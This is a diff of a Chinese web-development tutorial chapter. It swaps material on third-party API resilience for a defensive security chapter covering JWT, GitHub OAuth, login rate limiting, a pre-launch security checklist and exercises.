-  如果对方已经连续失败了十次，第十一次大概率还是失败。
-  继续调用只会浪费时间、拖慢你自己的响应。<strong>熔断器</strong>会在失败到一定次数后
-  「跳闸」，一段时间内直接失败，不再发出请求。
-</p>
 
 <div class="code" data-lang="ts">
 <pre>
-export function createBreaker&lt;T&gt;(fn: () =&gt; Promise&lt;T&gt;, opts = { threshold: 5, resetMs: 60_000 }) {
-  let failures = 0
-  let openUntil = 0
-
-  return async (): Promise&lt;T&gt; =&gt; {
-    if (Date.now() &lt; openUntil) {
-      throw new Error('熔断器已跳闸，暂时不调用该服务')
-    }
-
-    try {
-      const result = await fn()
-      failures = 0                       // 成功一次就重置
-      return result
-    } catch (err) {
-      failures++
-      if (failures &gt;= opts.threshold) {
-        openUntil = Date.now() + opts.resetMs
-        console.error(`熔断器跳闸，${opts.resetMs / 1000} 秒后重试`)
-      }
-      throw err
-    }
-  }
-}
+app.use('*', loadUser)
+app.use('/account/*', requireLogin)
+app.use('/admin/*', requireRole('admin', 'staff'))
 </pre>
 </div>
 
-<h3>③ 超时预算</h3>
-
-<div class="box warn">
-  <div class="t">&#9888; 你的超时必须比调用方的超时短</div>
-  <p>
-    如果浏览器等你 10 秒，而你等第三方 30 秒，那么第三方一慢，
-    用户看到的就是浏览器超时 —— 而你的服务器还在傻等，占着连接和内存。<br>
-    <strong>给每个外部调用设置明确的超时，并且加起来要小于你自己的响应目标。</strong>
-    比如：目标 2 秒响应，那么两个外部调用各给 800 ms。
-  </p>
-</div>
+<h3>方案二：JWT（适合 API）</h3>
 
 <figure>
-<svg class="dgm" viewBox="0 0 760 250" role="img" aria-label="超时预算的分配">
-  <text class="ttl" x="20" y="24">用户能接受的等待时间，要在整条链路上分配完</text>
+<svg class="dgm" viewBox="0 0 760 240" role="img" aria-label="JWT 的三段结构与验证流程">
+  <rect class="bx-b" x="40" y="26" width="200" height="48" rx="8"/>
+  <text class="sm on-b" x="140" y="48" text-anchor="middle">Header</text>
+  <text class="mono sm" x="140" y="66" text-anchor="middle">{"alg":"HS256"}</text>
 
-  <rect class="bx-b" x="20" y="40" width="720" height="34" rx="6"/>
-  <text class="sm on-b" x="380" y="62" text-anchor="middle">浏览器愿意等：约 3 秒</text>
+  <rect class="bx-p" x="270" y="26" width="220" height="48" rx="8"/>
+  <text class="sm on-p" x="380" y="48" text-anchor="middle">Payload（载荷）</text>
+  <text class="mono sm" x="380" y="66" text-anchor="middle">{"sub":"u_1","role":"admin","exp":…}</text>
 
-  <rect class="bx-a" x="60" y="86" width="640" height="34" rx="6"/>
-  <text class="sm on-a" x="380" y="108" text-anchor="middle">你给自己的目标：2 秒内返回</text>
+  <rect class="bx-g" x="520" y="26" width="200" height="48" rx="8"/>
+  <text class="sm on-g" x="620" y="48" text-anchor="middle">Signature（签名）</text>
+  <text class="mono sm" x="620" y="66" text-anchor="middle">用密钥算出来的校验码</text>
 
-  <rect class="bx-g" x="100" y="132" width="270" height="34" rx="6"/>
-  <text class="sm on-g" x="235" y="154" text-anchor="middle">天气 API：超时 800 ms</text>
+  <text class="mono sm" x="380" y="98" text-anchor="middle">eyJhbGciOi… . eyJzdWIiOi… . 4f3d2a1b…</text>
 
-  <rect class="bx-g" x="380" y="132" width="230" height="34" rx="6"/>
-  <text class="sm on-g" x="495" y="154" text-anchor="middle">数据库查询：超时 500 ms</text>
+  <rect class="bx-a" x="60" y="122" width="300" height="100" rx="10"/>
+  <text class="ttl on-a" x="210" y="146" text-anchor="middle">优点</text>
+  <text class="sm" x="76" y="170">服务器<tspan>不用存</tspan>任何东西</text>
+  <text class="sm" x="76" y="190">任何一台机器都能独立验证</text>
+  <text class="sm" x="76" y="210">天然适合无状态、多实例、边缘</text>
 
-  <rect class="bx-d" x="620" y="132" width="80" height="34" rx="6"/>
-  <text class="sm" x="660" y="154" text-anchor="middle">渲染等</text>
-
-  <path class="ln-d" d="M100 172 V190 H700 V172"/>
-  <text class="sm" x="400" y="208" text-anchor="middle">800 + 500 + 余量 &lt; 2000 ms　&#10003;</text>
-
-  <rect class="bx-r" x="120" y="216" width="520" height="30" rx="6"/>
-  <text class="sm on-r" x="380" y="236" text-anchor="middle">如果外部调用超时设成 30 秒：用户早就走了，你的服务器还在等</text>
+  <rect class="bx-r" x="400" y="122" width="300" height="100" rx="10"/>
+  <text class="ttl on-r" x="550" y="146" text-anchor="middle">代价</text>
+  <text class="sm" x="416" y="170">签发之后<tspan class="on-r">无法主动作废</tspan></text>
+  <text class="sm" x="416" y="190">用户改密码/被封号，旧令牌仍有效</text>
+  <text class="sm" x="416" y="210">所以有效期要短（15 分钟）+ 刷新令牌</text>
 </svg>
-<figcaption>图 20-3　超时是从外往里分配的预算，不是随手填的数字</figcaption>
+<figcaption>图 20-3　JWT 是「可验证的自包含凭证」，不是「加密的秘密」</figcaption>
 </figure>
 
-<div class="box tip">
-  <div class="t">&#128161; 反过来的方向</div>
-  <p>这一章讲的是「你主动调别人」。如果对方要<strong>主动通知你</strong>（支付结果、审核完成），那是 Webhook —— 思维完全反过来，见<strong>第 23 章</strong>。</p>
+<div class="code" data-lang="ts">
+<pre>
+import { jwt, sign } from 'hono/jwt'
+
+// 签发
+app.post('/api/v1/auth/login', zValidator('json', loginSchema), async (c) =&gt; {
+  const { email, password } = c.req.valid('json')
+  const user = await db.getUserByEmail(email)
+
+  if (!user || !(await verify(user.passwordHash, password))) {
+    throw new HTTPException(401, { message: '邮箱或密码不正确' })
+  }
+
+  const token = await sign(
+    {
+      sub: user.id,
+      role: user.role,
+      exp: Math.floor(Date.now() / 1000) + 60 * 15,   // 15 分钟
+    },
+    c.env.JWT_SECRET
+  )
+
+  return c.json({ token })
+})
+
+// 验证：中间件会自动检查 Authorization: Bearer xxx
+app.use('/api/v1/protected/*', (c, next) =&gt;
+  jwt({ secret: c.env.JWT_SECRET })(c, next)
+)
+
+app.get('/api/v1/protected/me', (c) =&gt; {
+  const payload = c.get('jwtPayload')
+  return c.json({ userId: payload.sub, role: payload.role })
+})
+</pre>
 </div>
 
-<h2 id="social">社交媒体嵌入</h2>
-
 <div class="box warn">
-  <div class="t">&#9888; 一个分享按钮可能拖慢整个页面</div>
+  <div class="t">&#9888; JWT 的载荷是<strong>公开的</strong></div>
   <p>
-    第三方的嵌入脚本（分享按钮、评论组件、客服挂件、统计代码）通常会：
-    加载几百 KB 的 JS、发起十几个额外请求、插入 iframe、拖慢首屏、
-    并且它们的可用性完全不受你控制。
+    那三段只是 Base64 编码，不是加密。任何人复制粘贴到
+    <a href="https://jwt.io">jwt.io</a> 就能看到全部内容。<br>
+    <strong>不要往载荷里放密码、身份证号、任何敏感信息。</strong>
+    签名保证的是「这些内容没被改过」，不是「别人看不到」。
   </p>
-  <p><strong>更好的做法：</strong></p>
+</div>
+
+<h2 id="oauth">第三方登录</h2>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 240" role="img" aria-label="OAuth 授权码流程">
+  <rect class="bx-b" x="20" y="30" width="110" height="44" rx="8"/>
+  <text class="sm" x="75" y="57" text-anchor="middle">用户</text>
+
+  <rect class="bx-a" x="325" y="30" width="110" height="44" rx="8"/>
+  <text class="sm on-a" x="380" y="57" text-anchor="middle">你的应用</text>
+
+  <rect class="bx-g" x="630" y="30" width="110" height="44" rx="8"/>
+  <text class="sm on-g" x="685" y="57" text-anchor="middle">GitHub</text>
+
+  <path class="ln-b" d="M75 80 V104 H375" marker-end="url(#ar)"/>
+  <text class="sm" x="230" y="98" text-anchor="middle">① 点击「用 GitHub 登录」</text>
+
+  <path class="ln-a" d="M380 112 V128 H680 V80" marker-end="url(#ar-a)"/>
+  <text class="sm" x="540" y="126" text-anchor="middle">② 重定向到 GitHub 授权页</text>
+
+  <path class="ln-g" d="M685 80 V152 H80 V80" marker-end="url(#ar)"/>
+  <text class="sm" x="380" y="150" text-anchor="middle">③ 用户在 GitHub 上登录并同意授权</text>
+
+  <path class="ln-b" d="M75 160 V176 H375" marker-end="url(#ar)"/>
+  <text class="sm" x="230" y="172" text-anchor="middle">④ 带着授权码回到你的回调地址</text>
+
+  <path class="ln-a" d="M435 176 H630" marker-end="url(#ar-a)"/>
+  <text class="sm" x="530" y="170" text-anchor="middle">⑤ 用授权码换令牌</text>
+
+  <rect class="bx-d" x="120" y="196" width="520" height="38" rx="8"/>
+  <text class="sm" x="380" y="220" text-anchor="middle">⑥ 拿令牌读到用户信息 → 在自己库里建号或找到已有账号 → 建立你自己的会话</text>
+</svg>
+<figcaption>图 20-4　你从头到尾都接触不到用户的 GitHub 密码</figcaption>
+</figure>
+
+<div class="code" data-lang="bash">
+<pre>
+npm install @hono/oauth-providers
+</pre>
+</div>
+
+<div class="code" data-lang="ts">
+<pre>
+import { githubAuth } from '@hono/oauth-providers/github'
+
+app.use('/auth/github', (c, next) =&gt;
+  githubAuth({
+    client_id: c.env.GITHUB_CLIENT_ID,
+    client_secret: c.env.GITHUB_CLIENT_SECRET,
+    scope: ['read:user', 'user:email'],
+  })(c, next)
+)
+
+app.get('/auth/github', async (c) =&gt; {
+  const profile = c.get('user-github')
+  if (!profile) throw new HTTPException(401, { message: '授权失败' })
+
+  const authId = `github:${profile.id}`
+
+  // 已有账号就用，没有就建一个
+  let user = await db.getUserByAuthId(authId)
+  if (!user) {
+    user = await db.createUser({
+      authId,
+      name: profile.name ?? profile.login,
+      email: profile.email ?? null,
+      role: 'customer',
+    })
+  }
+
+  // 从这里开始，走的是我们自己的会话逻辑
+  c.get('session').userId = user.id
+  return c.redirect(c.get('session').returnTo ?? '/account', 303)
+})
+</pre>
+</div>
+
+<div class="box key">
+  <div class="t">&#9733; 数据库设计要点</div>
+  <p>
+    用 <code>authId</code> 这种带前缀的字段（<code>github:12345</code>、<code>google:67890</code>）
+    而不是把 GitHub ID 直接当主键。这样：<br>
+    ① 一个用户可以绑定多个登录方式；② 将来加新的登录渠道不用改表结构；<br>
+    ③ 不同平台的 ID 撞号了也不会出问题。
+  </p>
+</div>
+
+<h2 id="ratelimit">限流</h2>
+
+<p>没有限流的登录接口，等于邀请别人来撞库：</p>
+
+<div class="code" data-lang="ts">
+<pre>
+import { createMiddleware } from 'hono/factory'
+
+export function rateLimit(opts: { limit: number; windowSec: number; kv: KVNamespace }) {
+  return createMiddleware(async (c, next) =&gt; {
+    const ip =
+      c.req.header('cf-connecting-ip') ??
+      c.req.header('x-forwarded-for')?.split(',')[0].trim() ??
+      'unknown'
+
+    const key = `rl:${c.req.path}:${ip}`
+    const count = Number((await opts.kv.get(key)) ?? 0)
+
+    if (count &gt;= opts.limit) {
+      c.header('Retry-After', String(opts.windowSec))
+      throw new HTTPException(429, { message: '请求太频繁，请稍后再试' })
+    }
+
+    await opts.kv.put(key, String(count + 1), { expirationTtl: opts.windowSec })
+    await next()
+  })
+}
+
+// 登录接口：一分钟最多 5 次
+app.use('/login', (c, next) =&gt;
+  rateLimit({ limit: 5, windowSec: 60, kv: c.env.RATE_LIMIT })(c, next)
+)
+</pre>
+</div>
+
+<h2 id="checklist">上线前安全清单</h2>
+
+<div class="box key">
+  <div class="t">&#9733; 逐项确认</div>
   <ul>
-    <li>分享按钮用纯链接实现（<code>https://twitter.com/intent/tweet?url=...</code>），零 JavaScript。</li>
-    <li>确实需要的嵌入，用<strong>惰性加载</strong>：先显示一个占位图，用户点击后才真正加载。</li>
-    <li>所有第三方脚本加 <code>defer</code> 或 <code>async</code>，绝不阻塞渲染。</li>
-    <li>用第 19 章的 CSP 限制第三方脚本能做什么。</li>
+    <li>☐ 全站 HTTPS，HTTP 自动跳转</li>
+    <li>☐ <code>secureHeaders()</code> 已启用，CSP 已调好</li>
+    <li>☐ 会话 Cookie 有 <code>httpOnly</code> + <code>secure</code> + <code>sameSite</code></li>
+    <li>☐ 表单类请求有 CSRF 防护</li>
+    <li>☐ 所有输入都用 Zod 校验过（第 8 章）</li>
+    <li>☐ 模板输出自动转义，<code>raw()</code> 只用于可信内容（第 7 章）</li>
+    <li>☐ 数据库查询用参数绑定，没有拼接 SQL 字符串</li>
+    <li>☐ 密码用 Argon2 / bcrypt / PBKDF2 哈希</li>
+    <li>☐ 登录、注册、重置密码接口有限流</li>
+    <li>☐ 错误响应不泄露堆栈和内部信息（第 17 章）</li>
+    <li>☐ 密钥都在环境变量里，没有提交到 Git（第 9 章）</li>
+    <li>☐ 上传文件限大小、限类型、改名（第 8 章）</li>
+    <li>☐ 依赖跑过 <code>npm audit</code>，高危漏洞已处理</li>
+    <li>☐ 日志里没有密码、令牌、个人隐私（第 12 章）</li>
   </ul>
 </div>
 
 <h2 id="summary">小结</h2>
 
 <ul>
-  <li>默认在后端调第三方 API：保护 Key、能缓存、无 CORS、可统一处理错误。</li>
-  <li><code>fetch</code> 要包一层：超时、区分可重试与不可重试、指数退避加抖动。</li>
-  <li>缓存是最重要的优化，边缘环境要用共享缓存。</li>
-  <li>地理编码这类「结果不变」的调用，在数据录入时做一次并存库。</li>
-  <li>用降级、熔断、超时预算保证第三方故障不会传染给你。</li>
-  <li>第三方前端脚本要惰性加载，能用纯链接就别用脚本。</li>
+  <li>HTTPS 是底线；在代理后面要用 <code>X-Forwarded-Proto</code> 判断，且只信任自己的代理。</li>
+  <li><code>secureHeaders()</code> 一行加上一组防护，CSP 是 XSS 的最后一道防线。</li>
+  <li>CSRF 靠 <code>SameSite</code> + Origin 校验；Bearer 令牌认证天然免疫。</li>
+  <li>密码用专门的慢哈希算法；能不自己管密码就不管。</li>
+  <li>认证问「你是谁」（401），授权问「你能做什么」（403）。</li>
+  <li>会话认证适合网页，JWT 适合 API；JWT 载荷是公开的，有效期要短。</li>
+  <li>登录类接口必须限流。</li>
+  <li>「你能做什么」只是一半，「这条数据是不是你的」是另一半 —— 见下一章。</li>
 </ul>
 
 <div class="exercise">
   <h3>动手练习</h3>
   <ol>
-    <li>实现 <code>fetchJson</code>，用它调用任意一个公开 API。把超时改成 1 毫秒，确认它正确抛出超时错误而不是永久挂起。</li>
-    <li>给天气组件接上真实数据并加上 15 分钟缓存。在日志里打印实际发出的外部请求，刷新页面十次，确认只发了一轮。</li>
-    <li>把天气 API 的地址故意改错，确认首页仍然正常显示，只是没有天气组件。</li>
-    <li>实现熔断器，用一个必定失败的 URL 测试：连续失败 5 次后，第 6 次应该立刻失败而不发请求。</li>
-    <li>检查你的项目：用户请求路径上有几个外部调用？每一个的超时是多少？加起来会不会超过你的响应目标？</li>
+    <li>接上 <code>secureHeaders()</code>，用 <code>curl -I</code> 看看多了哪些响应头。然后配一个 CSP，故意加载一个外部脚本，观察浏览器控制台的拦截报告。</li>
+    <li>实现完整的注册和登录流程，用 Argon2 或 PBKDF2 存密码。确认数据库里存的是哈希而不是明文。</li>
+    <li>实现 <code>requireLogin</code> 和 <code>requireRole</code>，保护 <code>/account</code> 和 <code>/admin</code>。用未登录状态访问，确认跳转到登录页并且登录后能跳回原页面。</li>
+    <li>做一个 JWT 版本的登录接口，用 <code>curl</code> 拿到令牌后访问受保护接口。把令牌粘到 jwt.io 上看看里面有什么。</li>
+    <li>给登录接口加限流，用循环发 10 次请求，确认第 6 次开始返回 429。</li>
+    <li>对照上面的清单，逐项检查你现在的项目。</li>
   </ol>
 </div>
 
